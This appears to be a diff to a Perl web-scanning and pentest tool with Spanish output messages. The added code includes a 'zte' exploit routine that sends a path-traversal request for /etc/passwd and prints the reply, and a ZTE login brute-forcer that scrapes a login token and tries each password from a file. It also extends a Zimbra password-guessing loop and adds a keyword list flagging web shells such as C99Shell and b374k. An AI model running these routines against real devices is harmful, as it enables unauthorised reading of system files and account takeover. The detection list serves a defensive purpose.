@@ -153,6 +153,12 @@ foreach my $file (@links) {
 			}
 		}
 	
+	# check body and headers
+	my $backdoor=" ";
+	if ($decoded_content =~ / RAT |C99Shell|b374k| r57 | wso | pouya | Kacak /i){	 
+		$backdoor = " (Posible Backdoor)\t";
+	}
+	
 	if($status !~ /404|500|302|303|301|503|400/m){		
 		my @status_array = split(" ",$status);	
 		my $current_status = $status_array[0];
@@ -161,7 +167,7 @@ foreach my $file (@links) {
 		$options = $response2->{_headers}->{allow};	
 		$options =~ s/GET|HEAD|POST|OPTIONS//g; # delete safe methods	
 		$options =~ s/,,//g; # delete safe methods	
-		print "$current_status\t$url\t$options \n";
+		print "$current_status\t$url$backdoor $options \n";
 		#$result_table->add($url,$status,$options);			
 	}
 	
@@ -385,6 +391,39 @@ foreach my $file (@links)
 }
 
 
+sub exploit
+{
+my $self = shift;
+my $headers = $self->headers;
+my $debug = $self->debug;
+my $rhost = $self->rhost;
+my $rport = $self->rport;
+my $ssl = $self->ssl;
+
+
+my %options = @_;
+my $module = $options{ module };
+my $path = $options{ path };
+
+
+print color('bold blue') if($debug);
+print "######### Testendo: $module ##################### \n\n" if($debug);
+print color('reset') if($debug);
+
+my $url;
+if ($ssl)
+  {$url = "https://".$rhost.":".$rport.$path;}
+else
+  {$url = "http://".$rhost.":".$rport.$path;}
+  
+if ($module eq "zte")
+{
+	my $response = $self->dispatch(url => $url."../../../../../../../../../../../../etc/passwd",method => 'GET', headers => $headers);
+	my $decoded_response = $response->decoded_content;
+	print "$decoded_response \n";
+}
+
+}
 
 
 sub passwordTest
@@ -437,7 +476,7 @@ if ($module eq "ZKSoftware")
 		if ($status =~ /200/m)
 		{
 			if  ($decoded_response =~ /Department|Departamento/m){	 
-			print "Password encontrado $url Usuario:$user Password:$password)\n";
+			print "Password encontrado $url Usuario:$user Password:$password\n";
 			last;
 			}							
 		}	
@@ -449,7 +488,7 @@ if ($module eq "ZKSoftware")
 
 if ($module eq "zimbra")
 {
-		
+	my $counter = 1;	
 	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
 	while (my $password=<MYINPUT>)
 	{ 
@@ -463,16 +502,82 @@ if ($module eq "zimbra")
 		my $post_data = convert_hash($hash_data);
 		
 		$headers->header("Content-Type" => "application/x-www-form-urlencoded");
-		$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");		
+		$headers->header("Cookie" => "ZM_TEST=true");
+		$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");				
 		
 		my $response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
 		my $decoded_response = $response->decoded_content;
 		my $status = $response->status_line;
 		
+		if ($decoded_response =~ /error en el servicio de red|network service error/i)
+		{				 
+			print "El servidor Zimbra esta bloqueando nuestra IP :( \n";
+			last;
+										
+		}	
+		
+		
 		print "[+] user:$user password:$password status:$status\n";
 		if ($status =~ /302/m)
 		{				 
-			print "Password encontrado $url Usuario:$user Password:$password)\n";
+			print "Password encontrado $url (Usuario:$user Password:$password)";
+			last;
+										
+		}
+		
+		#if (0 == $counter % 10) {
+			#print "Sí es múltiplo de 10\n";
+			#sleep 120;
+		#}			
+		$counter = $counter + 1;
+		#sleep 1;
+	}
+	close MYINPUT;	
+}#zimbra
+
+
+if ($module eq "zte")
+{
+			
+	open (MYINPUT,"<$passwords_file") || die "ERROR: Can not open the file $passwords_file\n";	
+	while (my $password=<MYINPUT>)
+	{ 
+	
+		$headers->header("Content-Type" => "application/x-www-form-urlencoded");
+		$headers->header("Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");		
+		$headers->header("Cookie" => "_TESTCOOKIESUPPORT=1");		
+		
+		my $response = $self->dispatch(url => $url,method => 'GET', headers => $headers);
+		my $decoded_response = $response->decoded_content;
+		$decoded_response =~ s/"//g; 
+		$decoded_response =~ s/\)//g; 
+		my $status = $response->status_line;
+	
+
+		#getObj(Frm_Logintoken.value = 8;;
+		$decoded_response =~ /Frm_Logintoken.value = (.*?);/;
+		my $Frm_Logintoken = $1; 
+				
+		
+		$password =~ s/\n//g; 	
+		my $hash_data = {"frashnum" => "",
+						 "action" => "login",
+						 "Frm_Logintoken" => $Frm_Logintoken,
+						'Username' => $user, 
+						'Password' => $password
+				};	
+	
+
+		my $post_data = convert_hash($hash_data);
+		
+		$response = $self->dispatch(url => $url,method => 'POST',post_data =>$post_data, headers => $headers);
+		$decoded_response = $response->decoded_content;
+		$status = $response->status_line;
+		
+		print "[+] user:$user password:$password status:$status\n";
+		if ($status =~ /302/m)
+		{				 
+			print "Password encontrado $url (Usuario:$user Password:$password)\n";
 			last;
 										
 		}	
@@ -505,7 +610,7 @@ if ($module eq "PRTG")
 		
 		
 		if (! ($response_headers =~ /error/m)){	 
-			print "Password encontrado $url Usuario:$user Password:$password)\n";
+			print "Password encontrado $url Usuario:$user Password:$password\n";
 			last;
 		}
 		
@@ -526,7 +631,18 @@ if ($module eq "phpmyadmin")
 		my $decoded_response = $response->decoded_content;
 		#name="token" value="3e011556a591f8b68267fada258b6d5a"
 		$decoded_response =~ /name="token" value="(.*?)"/;
-		my $token = $1; 
+		my $token = $1;
+		
+		#open (SALIDA,">phpmyadmin.html") || die "ERROR: No puedo abrir el fichero google.html\n";
+		#print SALIDA $decoded_response;
+		#close (SALIDA);
+
+
+		if ($decoded_response =~ /respondiendo|not responding/i)
+		{			
+			print "ERROR: El servidor no está respondiendo \n";
+			last;									
+		}	 
 
 		
 		#pma_username=dgdf&pma_password=vhhg&server=1&target=index.php&token=918ab63463cf3b565d0073973b84f21c
@@ -575,7 +691,7 @@ if ($module eq "phpmyadmin")
 					
 		if (! ($decoded_response =~ /pma_username/m))
 		{			
-			print "Password encontrado $url Usuario:$user Password:$password)\n";
+			print "Password encontrado $url Usuario:$user Password:$password\n";
 			last;									
 		}	
 		
@@ -585,7 +701,6 @@ if ($module eq "phpmyadmin")
 
 
 }
-
 
 
 
@@ -699,6 +814,13 @@ if ($redirect_url eq '')
   #<html><script>document.location.replace("/+CSCOE+/logon.html")</script></html>
 
 	$decoded_response =~ /location.replace\("(.*?)"/;
+	$redirect_url = $1;	
+}
+
+if ($redirect_url eq '')
+{	
+  #jumpUrl = "/cgi-bin/login.html";
+	$decoded_response =~ /jumpUrl = "(.*?)"/;
 	$redirect_url = $1;	
 }
 
@@ -872,6 +994,9 @@ if($decoded_response =~ /wp-content/i)
 if($decoded_response =~ /csrfmiddlewaretoken/i)
 	{$type=$type."|"."Django";} 	
 
+if($decoded_response =~ /IP Phone/i)
+	{$type=$type."|"." IP Phone ";} 			
+
 if($decoded_response =~ /X-Amz-/i)
 	{$type=$type."|"."amazon";} 	
 
@@ -882,7 +1007,10 @@ if($decoded_response =~ /phpmyadmin.css/i)
 	{$type=$type."|"."phpmyadmin";} 		
 	
 if($decoded_response =~ /Set-Cookie: webvpn/i)
-	{$type=$type."|"."ciscoASA";} 			
+	{$type=$type."|"."ciscoASA";} 	
+	
+if($decoded_response =~ /Huawei/i)
+	{$type=$type."|"."Huawei";} 				
 
 if($decoded_response =~ /FreeNAS/i)
 	{$title="FreeNAS";} 			
@@ -892,6 +1020,8 @@ if($decoded_response =~ /ciscouser/i)
 
 if($decoded_response =~ /pfsense-logo/i)
 	{$title="Pfsense";} 
+	
+	
 
 		
 
@@ -911,8 +1041,7 @@ if($type eq '' && $decoded_response =~ /login/m)
             "author" => $author,
             "proxy" => $proxy,
             "type" => $type,
-            "server" => $server,
-            
+            "server" => $server,            
         );
         
 
